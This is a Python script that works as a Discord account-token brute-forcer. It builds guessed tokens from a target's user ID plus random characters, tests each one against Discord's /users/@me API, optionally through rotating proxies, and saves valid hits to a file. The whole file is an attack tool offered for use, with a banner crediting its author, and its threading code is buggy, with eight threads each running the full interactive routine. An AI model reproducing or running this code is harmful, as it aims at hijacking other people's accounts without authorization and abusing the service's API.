import os
import base64
import time
import random
import string
import requests
import threading
from colorama import Fore, init, Style

def print_colored(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")

# Check and install required libraries
try:
    import requests
except ImportError:
    print_colored("Installing requests...", "31")
    import subprocess
    subprocess.call(["pip", "install", "requests"])
    print_colored("Requests installed!", "32")

try:
    from colorama import Fore, init, Style
except ImportError:
    print_colored("Installing colorama...", "31")
    import subprocess
    subprocess.call(["pip", "install", "colorama"])
    print_colored("Colorama installed!", "32")

def clear_console():
    os.system("cls")

def encode_base64(input_str):
    return base64.urlsafe_b64encode(input_str.encode()).decode().rstrip("=")

def generate_random_string(k):
    characters = string.ascii_letters + string.digits + "-_"
    return ''.join(random.choice(characters) for _ in range(k))

def get_token(user_id):
    token = f"{encode_base64(user_id)}.{generate_random_string(6)}.{generate_random_string(38)}"
    return token

def check_proxy(proxy):
    try:
        requests.get('https://www.google.com', proxies={'http': proxy, 'https': proxy}, timeout=5)
        return True
    except requests.RequestException:
        return False

def check_token_validity(token, proxy):
    headers = {
        'Authorization': token,
    }
    try:
        if proxy:
            if check_proxy(proxy):
                login = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers, proxies={'http': proxy, 'https': proxy})
            else:
                print(f"{Fore.RED}[-] Proxy not working, skipping token check.{Fore.RESET}")
                return
        else:
            login = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)

        if login.status_code == 200:
            print(f"{Fore.GREEN}[+] VALID {token}{Fore.RESET}")
            with open('hit.txt', "a+") as f:
                f.write(f'{token}\n')
        else:
            print(f"{Fore.RED}[-] INVALID {token}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[-] ERROR OCCURRED {token}")
        print(f"Error details: {e}")

def read_proxies_from_file(file_path):
    with open(file_path, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

def print_banner():
    banner = (Fore.MAGENTA + """
██   ██ ███████ ██████  ███    ███ ██ ███████ 
██   ██ ██      ██   ██ ████  ████ ██ ██      
███████ █████   ██████  ██ ████ ██ ██ ███████ 
██   ██ ██      ██   ██ ██  ██  ██ ██      ██ 
██   ██ ███████ ██   ██ ██      ██ ██ ███████ threading added my therealreed on github  (8 threads)
""" + Fore.LIGHTCYAN_EX)
    print(banner)

def main():
    init()
    clear_console()
    print_banner()
    print(f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    Dev:{Style.RESET_ALL} {Fore.MAGENTA}Hermis{Fore.WHITE} <3")
    time.sleep(3)
    clear_console()

    # Input validation
    while True:
        try:
            num_tokens_to_generate = int(input(
                f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    HOW MANY TOKENS  : {Fore.MAGENTA}"))
            user_id = input(
                f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    USER ID  : {Fore.MAGENTA}")

            if not user_id.isdigit():
                raise ValueError
            break

        except ValueError:
            print(f"{Fore.RED}Please enter a valid number.{Fore.RESET}")

    # Ask the user if they want to use proxies
    use_proxies = input(f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    Use Proxies? (y/n)  : {Fore.MAGENTA}").lower() == 'y'
    proxies = []

    # If using proxies, read proxies from file
    if use_proxies:
        proxy_file_path = 'proxies.txt'
        proxies = read_proxies_from_file(proxy_file_path)

        # Check if proxies are working
        working_proxies = [proxy for proxy in proxies if check_proxy(proxy)]

        if not working_proxies:
            print(f"{Fore.RED}No working proxies found. Exiting.{Fore.RESET}")
            return
        else:
            print(f"{Fore.GREEN}[+] Proxies are working.{Fore.RESET}")
            proxies = working_proxies

    clear_console()

    for _ in range(num_tokens_to_generate):
        token = get_token(user_id)
        proxy = random.choice(proxies) if use_proxies else None
        check_token_validity(token, proxy)

    time.sleep(1.5)
    clear_console()
    print_banner()
    print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Finished generating\n{Fore.CYAN}[$]{Style.RESET_ALL}    Press Enter to exit..")
    input()

if __name__ == "__main__":
    t1 = threading.Thread(target=main, args=())
    t2 = threading.Thread(target=main, args=())
    t3 = threading.Thread(target=main, args=())
    t4 = threading.Thread(target=main, args=())
    t5 = threading.Thread(target=main, args=())
    t6 = threading.Thread(target=main, args=())
    t7 = threading.Thread(target=main, args=())
    t8 = threading.Thread(target=main, args=())
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
     
     
    t1.join()
    t2.join()
    t3.join()
    t4.join()
    t5.join()
    t6.join()
    t7.join()
    t8.join()
    
 
